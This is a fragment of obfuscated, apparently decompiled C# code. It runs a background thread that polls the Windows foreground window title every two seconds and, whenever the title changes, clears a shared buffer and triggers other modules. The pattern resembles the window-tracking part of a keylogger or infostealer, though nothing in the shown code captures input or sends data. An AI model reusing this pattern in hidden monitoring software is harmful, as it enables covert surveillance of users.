using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using ns15;

namespace ns14;

internal sealed class Class69
{
	public static string string_0;

	public static Thread thread_0 = new Thread(smethod_1);

	private static List<Action> list_0 = new List<Action>
	{
		Class70.smethod_0,
		Class72.smethod_0
	};

	[DllImport("user32.dll")]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", SetLastError = true)]
	private static extern uint GetWindowThreadProcessId(IntPtr intptr_0, out uint uint_0);

	private static string smethod_0()
	{
		try
		{
			GetWindowThreadProcessId(GetForegroundWindow(), out var uint_);
			Process processById = Process.GetProcessById((int)uint_);
			string text = processById.MainWindowTitle;
			if (string.IsNullOrWhiteSpace(text))
			{
				text = processById.ProcessName;
			}
			return text;
		}
		catch (Exception)
		{
			return "Unknown";
		}
	}

	private static void smethod_1()
	{
		Class71.thread_0.Start();
		string text = "";
		while (true)
		{
			Thread.Sleep(2000);
			string_0 = smethod_0();
			if (!(string_0 != text))
			{
				continue;
			}
			text = string_0;
			Class60.string_0 = "";
			foreach (Action item in list_0)
			{
				item();
			}
		}
	}
}
